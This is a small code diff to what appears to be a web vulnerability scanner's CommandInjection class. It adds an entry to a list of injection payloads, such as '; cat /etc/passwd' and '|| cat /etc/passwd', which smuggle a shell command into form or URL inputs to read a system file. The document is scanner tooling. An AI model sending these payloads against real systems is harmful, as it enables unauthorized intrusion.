@@ -4,7 +4,7 @@ class CommandInjection():
 	"""docstring for CommandInjection"""
 	def __init__(self,se,urls,forms):
 		self.se = se
-		self.cheatsheets = [';cat /etc/passwd', '|| cat /etc/passwd','8.8.8.8 && cat /etc/passwd', '&;& cat /etc/passwd', '|cat /etc/passwd', 'cat put /etc/passwd'] #self.readFromFile("scan/commandInjectionCheatSheet.txt")
+		self.cheatsheets = [';cat /etc/passwd', 'cat /etc/passwd', '|| cat /etc/passwd','8.8.8.8 && cat /etc/passwd', '&;& cat /etc/passwd', '|cat /etc/passwd', 'cat put /etc/passwd'] #self.readFromFile("scan/commandInjectionCheatSheet.txt")
 		self.urls = urls
 		self.vulnLinks = []
 		self.forms = forms
